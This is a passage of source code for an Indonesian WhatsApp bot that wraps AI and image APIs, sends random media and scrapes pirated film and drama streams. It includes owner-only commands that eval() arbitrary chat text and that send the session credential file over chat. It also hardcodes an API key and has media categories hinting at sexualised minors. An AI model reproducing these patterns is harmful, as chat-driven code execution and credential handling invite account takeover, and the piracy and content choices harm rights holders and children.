         let blc = await (await fetch(`https://api.shannmoderz.xyz/ai/blackbox?query=${text}`)).json();
         let bok = 'BLACKBOX'
         let bck = 'session: false'
         let umri = 'https://telegra.ph/file/fa816a0874c160225383b.png'
         replyai(blc.result, bok, bck, umri);
    } catch (e) {
        m.reply(mess.error);
    }
    okk()
    break

case 'yousearch':
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} carikan informasi tentang dea afrizal`);
  try {
    wett()
     let you = await (await fetch(`https://api.shannmoderz.xyz/ai/yousearch?query=${text}`)).json();
     let sea = 'YOUSEARCH'
     let rch = 'session: false'
     let arc = 'https://telegra.ph/file/199d38b4edb86f34dce0d.png'
     replyai(you.result, sea, rch, arc);
   } catch (e) {
       m.reply(mess.error);
     }
   okk()
break

case 'cgt':
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${commad} halo kamu siapa`);
  try {
    wett()
    let cg = await (await fetch(`https://api.shannmoderz.xyz/ai/cgt?query=${text}`)).json()
    let gt = 'CGT AI'
    let gg = 'session: false'
    let tt = 'https://telegra.ph/file/4ac401e18f8558d848d03.png'
    replyai(cg.result.data.message, gt, gg, tt);
  } catch (e) {
      m.reply(mess.error)
    }
  okk()
break

case 'letmegpt':
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${commad} halo kamu siapa`);
  try {
    wett()
    let leet = await (await fetch(`https://api.shannmoderz.xyz/ai/letmegpt?query=${text}`)).json()
    let me = 'LETMEGPT'
    let egp = 'session: false'
    let meg = 'https://telegra.ph/file/e38029102b5bf1d8389e8.png'
    replyai(leet.result, me, egp, meg);
  } catch (e) {
      m.reply(mess.error)
    }
  okk()
break

case 'aoyo':
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${commad} halo kamu siapa`);
  try {
    wett()
    let aoy = await (await fetch(`https://api.shannmoderz.xyz/ai/aoyo?query=${text}`)).json()
    let oyo = 'AOYO AI'
    let yoy = 'session: false'
    let yoa = 'https://telegra.ph/file/27fa8a71694e20fa75b54.png'
    replyai(aoy.result, oyo, yoy, yoa);
  } catch (e) {
      m.reply(mess.error)
    }
  okk()
break

case 'goody':
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} halo tod`);
  try {
  wett()
  let god = await (await fetch(`https://api.shannmoderz.xyz/ai/goody?query=${text}`)).json();
  let dyy = 'GOODY AI'
  let urii = 'session: false'
  let iruu = 'https://telegra.ph/file/aa8b1efe2850881d3623c.png'
  replyai(god.result, dyy, urii, iruu);
  } catch (e) {
      m.reply(mess.error)
    }
  okk()
break

case 'tempmail':
    rezzx.secmail = rezzx.secmail ? rezzx.secmail : {}
    let id = "secmail"
    let lister = ["create", "message", "delete"]

    let [feature, inputs, inputs_, inputs__, inputs___] = text.split(" ")
    if (!lister.includes(feature)) {
        return m.reply("*Example:*\n" + prefix + command + " create\n\n*Pilih type yg ada*\n" + lister.map((v, index) => "  ○ " + v).join("\n"))
    }

    if (lister.includes(feature)) {
        if (feature === "create") {
            try {
                let eml = await random_mail()
                let info = eml[0].split('@')
                rezzx.secmail[id] = [
                    await m.reply("*EMAIL:*\n" + eml[0] + "\n\n" + "*Login:*\n" + info[0] + "\n\n*Domain:*\n" + info[1] + "\n\n_Ketik *" + prefix + command + " message* Untuk mengecek inbox_"),
                    eml[0],
                    info[0],
                    info[1]
                ]
            } catch (e) {
                await m.reply(mess.error)
            }
        }

        if (feature === "message") {
            if (!rezzx.secmail[id]) {
                return m.reply("Tidak ada pesan, buat email terlebih dahulu\nKetik *" + prefix + command + " create*")
            }

            try {
                let eml = await get_mails(rezzx.secmail[id][2], rezzx.secmail[id][3])
                let teks = eml.map((v, index) => {
                    return `*EMAIL [ ${index + 1} ]*
*ID* : ${v.id}
*Dari* : ${v.from}

*Subjek* : ${v.subject}
*Date* : ${v.date}
   `.trim()
                }).filter(v => v).join("\n\n________________________\n\n")
                await m.reply(teks || "*KOSONG*" + "\n\n_Ketik *" + prefix + command + " delete* Untuk menghapus email_")
            } catch (e) {
                await m.reply(mess.error)
            }
        }

        if (feature === "delete") {
            if (!rezzx.secmail[id]) {
                return m.reply("Tidak ada email yang terpakai")
            }

            try {
                delete rezzx.secmail[id]
                await m.reply("Sukses menghapus email")
            } catch (e) {
                await m.reply(mess.error)
            }
        }
    }
    break

// FITUR EPHOTO
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return m.reply(`Example : ${prefix+command} Alice`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
rezzx.sendMessage(m.chat, { image: { url: haldwhd }, caption: `🎁 *FOR YOU*` }, { quoted: m })
}
break

case 'wallhp': case 'wallml': case 'wallnime': case 'pubg': case 'randblackpink': case 'motor': case 'kucing': case 'kpop': case 'freefire': case 'eba': case 'boneka': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto':  case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
wett()
let heyy = await fetchJson(`https://raw.githubusercontent.com/DGXeon/XeonMedia/master/${command}.json`)
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
rezzx.sendMessage(m.chat, { image: { url: yeha }, caption : '🎁 *FOR YOU*' }, { quoted: m })
okk()
}
break

case 'wanted': case 'rainbow': case 'invert': case 'circle-img': case 'beautiful':
if (isBan) return m.reply(mess.ban)
if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .wanted*`)
if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .wanted*`)
if (/image/.test(mime)) {
wett()
let me2 = await rezzx.downloadAndSaveMediaMessage(quoted)
let em2 = await TelegraPH(me2)
let o2 = await getBuffer(`https://itzpire.com/maker/${command}?url=${em2}`)
rezzx.sendMessage(m.chat,{image: o2, caption: '🎁 *FOR YOU*'},{quoted: m})
okk()
}
break

case 'carbon':
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> .carbon const axios = require('axios')`)
  try {
    wett()
    let car = await (await fetch(`https://itzpire.com/maker/carbon?code=${text}`)).json()
    let bon = car.result
    rezzx.sendMessage(m.chat,{image:{url: bon}, caption: '🎁 *FOR YOU*'},{quoted: m})
    okk()
  } catch (err) {
      m.reply(mess.error)
    }
break

case 'copilot': {
  if (isBan) return m.reply(mess.ban)
  if (!text) m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} halo siapa kamu?*`)
  try {
    wett()
    let cop = await (await fetch(`https://itzpire.com/ai/bing-ai?model=Creative&q=${text}`)).json()
    let na = 'COPILOT AI'
    let an = 'session: false'
    let ana = 'https://telegra.ph/file/59daa7bee9ff2c3bd43e1.png'
    replyai(cop.result, na, an, ana)
    okk()
  } catch (err) {
      m.reply(mess.error)
    }
}
break

case 'backup':
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return (mess.owner)
  wett()
  let sesi = await fs.readFileSync('./session/creds.json')
  let user = await fs.readFileSync('./setup/database/user.json')
  let bann = await fs.readFileSync('./setup/database/banned.json')
  m.reply('*3 FILE BACKUP SUCCESS DIKIRIM DIPRIVAT CHAT*')
  okk()
  rezzx.sendMessage(`${owner}@s.whatsapp.net`, { document: user, mimetype: 'application/json', fileName: 'user.json' }, { quoted: m })
  rezzx.sendMessage(`${owner}@s.whatsapp.net`, { document: sesi, mimetype: 'application/json', fileName: 'creds.json' }, { quoted: m })
  rezzx.sendMessage(`${owner}@s.whatsapp.net`, { document: bann, mimetype: 'application/json', fileName: 'banned.json' }, { quoted: m })
  rezzx.sendMessage(`${owner}@s.whatsapp.net`, { text: 'backup success ✅' }, { quoted: m })
break

case 'poll': case 'createpolling': {
    if (isBan) return m.reply(mess.ban)
	if (!isOwner) return m.reply(mess.owner)
    let [poll, opt] = text.split("|")
    if (text.split("|") < 2) return await m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> .createpolling rezzx ganteng gk?|iya,ngga,biasa`)
    let options = []
    for (let i of opt.split(',')) {
      options.push(i)
    }
   await rezzx.sendMessage(m.chat, {poll: {name: poll, values: options }})
}
break
        
case 'toonce': case 'toviewonce': {
  if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`Reply Image/Video`)
  wett()
  if (/image/.test(mime)) {
    anuan = await rezzx.downloadAndSaveMediaMessage(quoted)
    rezzx.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{quoted: m })
  } else if (/video/.test(mime)) {
      anuanuan = await rezzx.downloadAndSaveMediaMessage(quoted)
      rezzx.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
    } okk()
}
break

case 'delsesi': case 'clearsession': {
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  fs.readdir("./session", async function (err, files) {
  if (err) {
    console.log('Unable to scan directory: ' + err);
    return m.reply('PERMINTAAN ERROR!! PESAN :*\n> *folder tidak ditemukan*' + err);
  } 
  let filteredArray = await files.filter(item => item.startsWith("pre-key") || item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state"))
  console.log(filteredArray.length); 
  let teks =`Terdeteksi *${filteredArray.length}* file sampah\n\n`
  if (filteredArray.length == 0) return m.reply(`${teks}`)
  filteredArray.map(function(e, i){
    teks += (i+1)+`. ${e}\n`
  })     
  m.reply(`${teks}`) 
  await sleep(2000)
  wett()
  await filteredArray.forEach(function (file) {
    fs.unlinkSync(`./session/${file}`)
  });
  await sleep(2000)
  m.reply("*PERMINTAAN BERHASIL!! PESAN :*\n> *sukses menghapus semua sampah, efek kena session*")     
  });
}
break

case 'x': {
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  try {
    const evaling = await eval(`;(async () => { ${text} })();`);
    m.reply(util.format(evaling))
  } catch (e) {
      m.reply(util.format(e))
    }
  }
break

case 'xx': {
  if (!isOwner) return m.reply(mess.only.owner)
  try {
    let evaled = await eval(budy.slice(2))
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
    await m.reply(evaled)
  } catch (err) {
      m.reply(String(err))
    }
}
break

case 'upvidey':
  let xx = m.quoted ? m.quoted : m
  let mim = (xx.msg || xx).mimetype || ''
  if (!mim) m.reply (`*PERMINTAAN ERRORN!! PESAN:*\n> send/reply video dengan caption ${prefix + command}`)
  let url = await xx.download()
  try {
    let res = await upvidey(url) 
    m.reply(res) 
  } catch (e) {
      m.reply('gagal uploading, pastikan anda mengirimkan video bukan gambar.') 
    }
break

case 'hijab': case 'china': case 'indo': case 'japan': case 'korea': case 'malaysia': case 'thailand': case 'vietnam': case 'random': case 'random2':
  if (isBan) return m.reply(mess.ban)
  okk()
  var asupann = JSON.parse(fs.readFileSync(`./lib/random/${command}.json`))
  var hasill = pickRandom(asupann)
  rezzx.sendMessage(m.chat, { image: { url: hasill.url }, caption: '🎁 *FOR YOU*' }, { quoted: m })
break

case 'girl': case 'ghea': case 'bocil': case 'ukhti': case 'santuy': case 'kayes': case 'panrika': case 'notnot':
  if (isBan) return m.reply(mess.ban)
  okk()
  var asupan = JSON.parse(fs.readFileSync(`./lib/random/${command}.json`))
  var hasil = pickRandom(asupan)
  rezzx.sendMessage(m.chat, { video: { url: hasil.url }, caption: '🎁 *FOR YOU*' }, { quoted: m })
break

case 'randomyande':
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  let kyy = await sendRandomYandereImage(m)
  rezzx.sendMessage( m.chat ,{ image: { url: kyy }, caption: '🎁 *FOR YOU*' }, { quoted: m })
break

case 'randomdanbo':
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  let kky = await sendRandomDanbooruImage(m)
  rezzx.sendMessage( m.chat ,{ image: { url: kky }, caption: '🎁 *FOR YOU*' }, { quoted: m })
break

case 'videy':
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> .videy link bokep')
  var anu = text.replace("v?id=", "")
  var bkp = anu.replace("https://", "https://cdn.")
  rezzx.sendMessage(m.chat, { video: { url: bkp + ".mp4" }, caption: "*SUCCESS* ✅" }, { quoted: m })
break

case 'baka': case 'bite': case 'blush': case 'bored': case 'cry': case 'cuddle': case 'dance': case 'facepalm': case 'feed': case 'handhold': case 'handshake': case 'happy': case 'highfive': case 'hug': case 'kiss': case 'laugh': case 'lurk': case 'nod': case 'nom': case 'nope': case 'pat': case 'peck': case 'poke': case 'pout': case 'punch': case 'shoot': case 'shrug': case 'slap': case 'sleep': case 'smile': case 'smug': case 'stare': case 'think': case 'thumbsup': case 'tickle': case 'wave': case 'wink': case 'yawn': case 'yeet': {
  if (isBan) return m.reply(mess.ban)
  wett()
  let wet = await (await fetch(`https://nekos.best/api/v2/${command}`)).json();
  let stkk = wet.results[0];
  rezzx.sendStickerImg(from, stkk.url, m, { packname: global.packname, author: global.author })
  okk()
  m.reply(`🎇 *ANIME CHARAKTER:* ${stkk.anime_name}`)
}
break

case 'emojimix': { 
  if (isBan) return m.reply(mess.ban)
  try {
    let [emoji1, emoji2] = text.split`+`
    if (!emoji1 && !emoji2) m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command}* 😂+😍`)
    let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
    for (let res of anu.results) {
      wett()
      let encmedia = await rezzx.sendStickerImg(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
      await fs.unlinkSync(encmedia)
    }
  } catch (err) {
     m.reply(mess.error)
   }
   okk()
}
break

case 'listcase': {
reply(listCase())
}
break

case 'wm': {
  if (!isGroup) return m.reply(mess.group)
  if (isBan) return m.reply(mess.ban)
  if (!text) m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *kirim/reply sticker dengan caption .wm rezzx*`)
  try {
    if (!quoted) m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *kirim/reply sticker dengan caption .wm rezzx*`)
    if (/image/.test(mime)) {
      let media = await quoted.download()
      let encmedia = await rezzx.sendStickerImg(from, media, m, { packname: `${text}`, author: `RezzX-BOT` })
      await fs.unlinkSync(encmedia)
    }
  } catch (e) {
     m.reply(mess.error)
    }
}
break

case 'searchfilm': case 'sfilm': {
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} batman*`);
    if (isBan) return m.reply(mess.ban);
    m.reply(mess.wait);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/film?q=${text}&apikey=${neo}`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 6).map(film => ({
                title: film.title,
                rows: [
                    {
                        title: 'Detail Film',
                        description: `Detail Dari Film *${film.title}*`,
                        id: `.detailfilm ${film.url}`
                    },
                    {
                        title: 'Streaming Film',
                        description: `Link Streaming Film *${film.title}*`,
                        id: `.streamfilm ${film.url}`
                    },
                    {
                        title: 'Download Film',
                        description: `Link Download Film *${film.title}`,
                        id: `.downfilm ${film.url}`
                    }
                ]
            }));

            let listMessage = {
                title: 'Selengkapnya 🎁',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '_',
                                    newsletterName: waktu,
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: rezzx.decodeJid(rezzx.user.id) },
                                forwardingScore: 256,
                                externalAdReply: {
                                    title: 'RezzX-V12',
                                    thumbnailUrl: json.data[0].thumbnail, 
                                    sourceUrl: json.data[0].url, 
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `🔍 *SEARCH FILM*\n📂 *Cloud:* tv.lk21.official.wiki`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '© RezzX-V12'
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "Result",
                                hasMediaAttachment: false,
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: m });

            rezzx.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        } else {
            m.reply('*PERMINTAAN ERROR!! PESAN :*\n> film tidak ditemukan!!');
        }
    } catch (error) {
        m.reply(mess.error);
    }
}
break
case 'detailfilm': {
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} https://tv.lk21.official.wiki/xxxx*`);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/film-get?url=${encodeURIComponent(text)}&apikey=${neo}`);
        let result = await res.json();
        
        if (result.status && result.data) {
            let data = result.data;
            let caption = `👑 *Director:* ${data.director}\n👤 *Aktor:* ${data.actors}\n🔖 *Genre:* ${data.genre}\n🎲 *Rating:* ${data.imdb}\n📟 *Durasi:* ${data.duration}\n📆 *Release:* ${data.release}\n🚩 *Negara:* ${data.country}\n📌 *Quality:* ${data.quality}`
            await rezzx.sendMessage(m.chat, { image: { url: data.thumbnail }, caption: teks },{quoted:m})
        } else {
            m.reply('*PERMINTAAN ERROR!! PESAN :*\n> film tidak ditemukan!!');
        }
    } catch (err) {
        m.reply(mess.error);
    }
}
break

case 'downfilm': {
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} https://tv.lk21.official.wiki/xxxx*`);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/film-get?url=${text}&apikey=${neo}`);
        let result = await res.json();
        if (result.status && result.stream.length > 0 && result.download.length > 0) {
            let downloadButtons = result.download.map(download => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Download ${download.provider}`,
                    url: download.url,
                    merchant_url: download.url
                })
            }));
            
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '_',
                                    newsletterName: waktu,
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: '📂 *Cloud:* tv.lk21.official.wiki'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '© RezzX-V12'
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `🎁 *DOWNLOAD FILM*`,
                                subtitle: "RezzX-V12",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: downloadButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            rezzx.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            m.reply('*PERMINTAAN ERROR!! PESAN :*\n> film tidak ditemukan!!');
        }
    } catch (err) {
        console.log(err);
        m.reply(mess.error);
    }
    }
    break;

case 'streamfilm': { 
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} https://tv.lk21.official.wiki/xxxx*`);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/film-get?url=${text}&apikey=${neo}`);
        let result = await res.json();
        if (result.status && result.stream.length > 0 && result.download.length > 0) {
            let streamButtons = result.stream.map(stream => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Stream ${stream.quality}`,
                    url: stream.url,
                    merchant_url: stream.url
                })
            }));
            
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '_',
                                    newsletterName: waktu,
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: '📂 *Cloud:* tv.lk21.official.wiki'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '© RezzX-V12'
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `🎁 *STREAMING FILM*`,
                                subtitle: "RezzX-V12",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: streamButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            rezzx.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            m.reply('*PERMINTAAN ERROR!! PESAN :*\n> film tidak ditemukan!!');
        }
    } catch (err) {
        console.log(err);
        m.reply(mess.error);
    }
    }
    break;

case 'detaildrakor': {
if (isBan) return m.reply(mess.ban)
if (!/https?:\/\/(www\.)?drakorasia\.us/i.test(args[0])) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} https://drakorasia.fun/xxxx*`)
m.reply(mess.wait)
try {
let res = await fetchJson(`https://api.neoxr.eu/api/drakor-get?url=${args[0]}&apikey=${neo}`)
if (res.status && res.data) {
let hasil = res.data
let teks = `🔖 *Judul:* ${hasil.title}*\n🔀 *Publisher:* ${hasil.channel}\n📌 *Sinopsis:* ${hasil.sinopsis}\n🎰 *TotalEpisode:* ${hasil.episode}\n🎲 *Genre:* ${hasil.genre[0]}\n📟 *Durasi:* ${hasil.duration}\n👤 *Aktor:* ${hasil.cast[0]}\n📆 *Release:* ${hasil.release}`
await rezzx.sendMessage(m.chat, { image: { url: hasil.thumbnail }, caption: teks },{quoted:m})
}
} catch (err) {
m.reply(mess.error)
}
}
break

case 'sdrakor':  case 'searchdrakor': {
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} peninsula*`);
    if (isBan) return m.reply(mess.ban);
    m.reply(mess.wait);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/drakor?q=${text}&apikey=${neo}`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 10).map(drakor => {
                let updatedUrl = drakor.url.replace('https://drakorasia.lol', 'https://drakorasia.us', 'https://drakorasia.fun');
                return {
                    title: drakor.title,
                    rows: [
                        {
                            title: 'Detail Drakor',
                            description: `Detail Dari Drakor *${drakor.title}*`,
                            id: `.detaildrakor ${updatedUrl}`
                        },
                        {
                            title: 'Streaming Drakor',
                            description: `Link Streaming Drakor *${drakor.title}*`,
                            id: `.streamdrakor ${updatedUrl}`
                        }
                    ]
                };
            });

            let listMessage = {
                title: 'Selengkapnya 🎁',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '_',
                                    newsletterName: waktu,
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: rezzx.decodeJid(rezzx.user.id) },
                                forwardingScore: 256,
                                externalAdReply: {
                                    title: 'RezzX-V12',
                                    thumbnailUrl: json.data[0].thumbnail,
                                    sourceUrl: json.data[0].url.replace('https://drakorasia.lol', 'https://drakorasia.us', 'https://drakorasia.fun'),
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `🔎 *DRAKOR SEARCH*\n📂 *Cloud:* drakorasia.lol, drakorasia.fun, drakorasia.us, 5.189.131.248`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '© RezzX-V12'
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "Result",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: m });

            rezzx.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        } else {
            m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> judul drakor tidak ditemukan!!`);
        }
